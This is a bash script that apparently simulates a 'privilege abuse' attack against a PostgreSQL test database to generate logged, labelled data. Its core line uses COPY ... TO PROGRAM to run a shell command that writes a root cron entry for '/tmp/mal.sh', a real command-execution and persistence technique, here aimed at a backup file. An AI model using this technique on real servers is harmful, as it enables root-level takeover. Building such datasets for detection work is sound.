#!/bin/bash
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity
echo "  identity=${CASCE_USER}@${CASCE_IP}"
echo "Simulating Privilege Abuse Attack (crontab_persist)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_crontab_persist" start
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT 1) TO PROGRAM 'echo '* * * * * root /tmp/mal.sh' >> /tmp/crontab.bak > /tmp/out_crontab_persist.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_crontab_persist" end
